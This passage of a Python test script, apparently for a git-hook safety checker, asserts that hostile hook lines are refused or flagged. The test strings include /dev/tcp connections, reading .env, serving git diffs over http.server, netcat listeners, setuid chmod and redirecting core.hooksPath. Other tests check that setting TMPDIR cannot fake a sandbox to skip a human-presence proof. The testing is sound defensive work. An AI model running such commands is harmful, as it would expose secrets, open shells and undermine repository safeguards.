           "time curl x", "command curl x", "echo a; curl x", "FOO=1 ssh host", "chmod 4755 f", "chmod u+s f", "echo x >> .git/config", "git config core.hooksPath /tmp/x", "cat .env", "git diff | python3", "git diff | python3 -m http.server",
           "exec 3<>/dev/tcp/1.2.3.4/80", "python3 -c 'import socket'", "(curl x)", "{ curl x; }", "while true; do nc -l 1; done"]:
    check("still refused: %r" % bd[:60], not _passes(GA, "#!/bin/bash\n" + bd + "\n"))
for att in ["cp x .git/hooks/y", "cp x .githooks/y", "chmod 755 f", "git push https://x.example/r.git main", "nohup ./run.sh &"]:
    w_ = GA.check_content(("#!/bin/bash\n" + att + "\n").encode())[1]
    check("ATTENTION (not refused): %r" % att, len(w_) >= 1, w_)
m_cp = mutant("        rxs = DENY + DENY_CMD + (DENY_BROAD if (hd or _BROAD.search(line)) else [])\n", "        rxs = DENY + DENY_CMD\n")
check("mutant 'broad scan for lines with substitutions or -c' is noticed", _passes(m_cp, "#!/bin/bash\nfind . -exec curl {} +\n"))
m_ml = mutant("        if _message_line(line) and not hd:\n            continue\n", "        if False:\n            continue\n")
check("mutant 'message lines are skipped' is noticed (an echo mention is refused)", not _passes(m_ml, "#!/bin/bash\necho \"edit .env first\" >&2\n"))

# ================================================================== 7  TMPDIR cannot make a real folder a sandbox
print("# 7 TMPDIR")
OUT2 = pathlib.Path(tempfile.mkdtemp(prefix="hkout2-", dir="/var/tmp")).resolve()
for sub in ("h", "c", "s", "w", "dev"):
    (OUT2 / sub).mkdir()
tm_env = {"TMPDIR": str(OUT2), "HOME": str(OUT2 / "h"), "SHIPMIRACLE_HOME": str(OUT2 / "h"), "SHIPMIRACLE_CONFIG": str(OUT2 / "c"), "SHIPMIRACLE_STATE": str(OUT2 / "s"),
          "SHIPMIRACLE_WS": str(OUT2 / "w"), "SHIPMIRACLE_DEV": str(OUT2 / "dev"), "CLAUDE_CONFIG_DIR": str(OUT2 / "h/.claude"), "SHIPMIRACLE_TEST": "1"}
probe = subprocess.run([sys.executable, "-c", "import sys; sys.path.insert(0, %r); from shipmiracle import paths, owner; print(paths.sandboxed(), paths._under_temp(%r), owner.proof_required())" % (str(ROOT), str(OUT2 / "dev"))],
                       env=child_env(tm_env), capture_output=True, text=True, stdin=subprocess.DEVNULL)
check("TMPDIR=/var/tmp/x with SHIPMIRACLE_TEST=1 and every root under it: sandboxed() is False, the folder is not temp, proof is required", probe.stdout.strip() == "False False True", (probe.stdout, probe.stderr[-200:]))
home_dev = pathlib.Path(os.path.expanduser("~")).parent  # a real, non-temp folder that exists (the account's parent folder): only its realpath is looked at, nothing is written
SHARED = "/Us" + "ers/Sh" + "ared"      # another real folder, assembled so the release home-path scan does not see a user-folder path
probe2 = subprocess.run([sys.executable, "-c", "import sys; sys.path.insert(0, %r); from shipmiracle import paths; print(paths._under_temp(%r))" % (str(ROOT), SHARED)],
                        env=child_env({"TMPDIR": SHARED}), capture_output=True, text=True, stdin=subprocess.DEVNULL)
check("TMPDIR pointing at another real folder (a shared folder) does not make it temp", probe2.stdout.strip() in ("False", ""), (probe2.stdout, probe2.stderr[-200:]))
check("fixed roots: _temp_roots() holds no /var/tmp and no TMPDIR value", all(not r.startswith("/private/var/tmp") for r in paths._temp_roots()) and str(OUT2) not in paths._temp_roots())
r = mk(old=OLD, base=OUT2)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, "apply\n")], env=child_env(tm_env))
check("B1 TMPDIR variant (pty): project in /var/tmp, TMPDIR and every sandbox root set under it, apply typed: refused (exit 4), hook unchanged, no presence bypass", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
src_p = (ROOT / "shipmiracle/paths.py").read_text()
mp = types.ModuleType("shipmiracle.paths_mut"); mp.__package__ = "shipmiracle"; mp.__file__ = "mutant"
old_roots = '    roots = ["/tmp", "/private/tmp", "/var/folders", "/private/var/folders"]\n'
assert src_p.count(old_roots) == 1
exec(compile(src_p.replace(old_roots, '    import tempfile\n    roots = ["/tmp", "/private/tmp", "/var/folders", "/private/var/folders", tempfile.gettempdir()]\n'), "mutant", "exec"), mp.__dict__)
import tempfile as _tf
_old_td, _old_env = _tf.tempdir, os.environ.get("TMPDIR")
_tf.tempdir = None; os.environ["TMPDIR"] = str(OUT2)
try:
    mut_hit = mp._under_temp(str(OUT2 / "dev")); real_hit = paths._under_temp(str(OUT2 / "dev"))
finally:
    _tf.tempdir = _old_td
    if _old_env is None:
        os.environ.pop("TMPDIR", None)
    else:
        os.environ["TMPDIR"] = _old_env
check("mutant 'gettempdir() is a temp root again' is noticed (the /var/tmp folder counts as temp), the real module says no", mut_hit and not real_hit, (mut_hit, real_hit))
import shipmiracle_isolation as _iso
_tf.tempdir = str(OUT2)
try:
    try:
        _iso.require_fixed_tmpdir(); aborted = False
    except SystemExit:
        aborted = True
finally:
    _tf.tempdir = _old_td
check("test helper: shipmiracle_isolation aborts when TMPDIR points outside the fixed temp roots", aborted)
shutil.rmtree(str(OUT2), ignore_errors=True)

shutil.rmtree(str(BASE), ignore_errors=True)
print("\nhooks apply tests: %d checks, %d failed" % (n_checks[0], len(fails)))
sys.exit(1 if fails else 0)
